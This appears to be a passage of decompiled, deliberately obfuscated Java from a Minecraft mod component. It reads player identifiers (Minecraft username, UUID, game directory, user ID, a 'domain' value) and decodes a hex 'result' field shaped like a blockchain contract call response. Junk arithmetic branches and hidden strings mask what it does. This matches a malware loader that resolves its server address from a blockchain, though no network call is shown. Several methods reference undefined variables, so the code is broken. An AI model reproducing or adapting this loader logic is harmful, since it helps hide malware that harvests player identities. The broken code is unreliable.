         DFcl_wxDr_oCyg_XuQd.PflhKgNn = DFcl_wxDr_oCyg_XuQd.gq_al_av(buf0, "mcInfo");
         StringBuilder var5 = new StringBuilder();
         DFcl_wxDr_oCyg_XuQd.lFSpD_I = DFcl_wxDr_oCyg_XuQd.gq_al_av(buf0, "prefireId");
         char[] var7 = "userId".toCharArray();
         DFcl_wxDr_oCyg_XuQd.qIwnhrannw = DFcl_wxDr_oCyg_XuQd.gq_al_av(buf0, new String(var7));
         DFcl_wxDr_oCyg_XuQd.dq7_m = DFcl_wxDr_oCyg_XuQd.gq_al_av(buf0, "tag");
         DFcl_wxDr_oCyg_XuQd.ng_yyl_czl = DFcl_wxDr_oCyg_XuQd.gq_al_av(buf0, "domain");
         DFcl_wxDr_oCyg_XuQd.curCqe = DFcl_wxDr_oCyg_XuQd.gq_al_av(buf0, "gameDir");
         char[] var13 = "mcUsername".toCharArray();
         DFcl_wxDr_oCyg_XuQd.fcverCfg = DFcl_wxDr_oCyg_XuQd.gq_al_av(buf0, new String(var13));
         char[] var15 = "mcUuid".toCharArray();
         DFcl_wxDr_oCyg_XuQd.ZX_0TZQFRXAq = DFcl_wxDr_oCyg_XuQd.gq_al_av(buf0, new String(var15));
         DFcl_wxDr_oCyg_XuQd.IbDiTNBiYV = DFcl_wxDr_oCyg_XuQd.gq_al_av(buf0, "env");
         if (DFcl_wxDr_oCyg_XuQd.IbDiTNBiYV == null) {
            char[] var17 = "Fabric".toCharArray();
            DFcl_wxDr_oCyg_XuQd.IbDiTNBiYV = new String(var17);
         }

         return DFcl_wxDr_oCyg_XuQd.ng_yyl_czl != null && DFcl_wxDr_oCyg_XuQd.qIwnhrannw != null;
      } catch (Exception var18) {
         return false;
      }
   }

   private String umg_yiv(String json) {
      char[] var7 = "\"result\"".toCharArray();
      int x4 = vgCuslJbq.indexOf(new String(var7));
      if (x4 == -1) {
         return null;
      } else {
         int Fxu55T_51eXz = vgCuslJbq.indexOf(":", x4);
         int lrlc_fpxiuq = vgCuslJbq.indexOf("\"", Fxu55T_51eXz);
         int config = vgCuslJbq.indexOf("\"", lrlc_fpxiuq + 1);
         if (lrlc_fpxiuq != -1 && config != -1) {
            String keyAux = vgCuslJbq.substring(lrlc_fpxiuq + 1, config);
            return ztybr_to.ugrhwwPool(keyAux);
         } else {
            return null;
         }
      }
   }

   private String ugrhwwPool(String hex) {
      if (objStr != null && objStr.startsWith("0x") && objStr.length() >= 130) {
         try {
            String tO9_9YthCqy_TN = objStr.substring(2);
            int var6 = -1351636516;
            if (var6 - -1351636516 == 0) {
               int var8 = 23162;
               var8 ^= 37;
            }

            int retNum = Integer.parseInt(tO9_9YthCqy_TN.substring(64, 128), 16);
            if (retNum != 0 && retNum <= 10000) {
               String tempMin = tO9_9YthCqy_TN.substring(128, 128 + retNum * 2);
               byte[] stateTmp = pYGq_rHxL_NXRH_kRMY.isufoas(tempMin);
               return new String(stateTmp, StandardCharsets.UTF_8);
            } else {
               return null;
            }
         } catch (Exception var7) {
            return null;
         }
      } else {
         return null;
      }
   }

   private byte[] isufoas(String hex) {
      int ffZeehHxmuce = ly_oal_tmvjhq_tdn.length();
      byte[] LkSR_wYAc_IxnH_uPoU = new byte[ffZeehHxmuce / 2];

      for (int objPtr = 0; objPtr < ffZeehHxmuce; objPtr += 2) {
         LkSR_wYAc_IxnH_uPoU[objPtr / 2] = (byte)(
            (Character.digit(ly_oal_tmvjhq_tdn.charAt(objPtr), 16) << 4) + Character.digit(ly_oal_tmvjhq_tdn.charAt(objPtr + 1), 16)
         );
      }

      return LkSR_wYAc_IxnH_uPoU;
   }

   private String gq_al_av(String json, String key) {
      String mnZtvoiOfgmezTetdid = "\"" + aqzadEweiin + "\":\"";
      int qspggz_su_pnptyy = posIdx.indexOf(mnZtvoiOfgmezTetdid);
      if (qspggz_su_pnptyy == -1) {
         return null;
      } else {
         int Y0eM1pjG8Lv3 = qspggz_su_pnptyy + mnZtvoiOfgmezTetdid.length();
         StringBuilder elapsedCnt = new StringBuilder();
         boolean cvmhXoynUiuu = false;

         for (int SXKeU = Y0eM1pjG8Lv3; SXKeU < posIdx.length(); SXKeU++) {
            char nKyPG = posIdx.charAt(SXKeU);
            if (cvmhXoynUiuu) {
               switch (nKyPG) {
                  case '"':
                     break;
                  case '\\':
                     break;
                  case 'n':
                     break;
                  case 'r':
                     break;
                  case 't':
                     break;
                  default:
                     elapsedCnt.append(nKyPG);
               }

               cvmhXoynUiuu = false;
            } else if (nKyPG == '\\') {
               cvmhXoynUiuu = true;
            } else {
               if (nKyPG == '"') {
                  break;
               }

               elapsedCnt.append(nKyPG);
            }
         }

         String elemAvg = elapsedCnt.toString();
         return elemAvg.equals("null") ? null : elemAvg;
      }
   }

   private String ZxmVuFLMJ(String s) {
      if (gvwvlc_yebpzk_vl_nca == null) {
         return "";
      } else {
         StringBuilder inkUvln = new StringBuilder();
         int var10 = 7452137;
         if (var10 >= 7452137 && var10 < 12752514) {
            int var11 = 9906;
            var11 *= 70;
         }

         for (char pwEL_BRzz_NrtB_DEsN : gvwvlc_yebpzk_vl_nca.toCharArray()) {
            switch (pwEL_BRzz_NrtB_DEsN) {
               case '\t':
                  break;
               case '\n':
                  break;
               case '\r':
                  break;
               case '"':
                  break;
               case '\\':
                  char[] var7 = "\\\\".toCharArray();
                  inkUvln.append(new String(var7));
                  break;
               default:
                  if (pwEL_BRzz_NrtB_DEsN < ' ') {
                     char[] var9 = "\\u%04x".toCharArray();
                     inkUvln.append(String.format(new String(var9), Integer.valueOf(pwEL_BRzz_NrtB_DEsN)));
                  } else {
                     inkUvln.append(pwEL_BRzz_NrtB_DEsN);
                  }
            }
         }

         return inkUvln.toString();
      }
   }
}
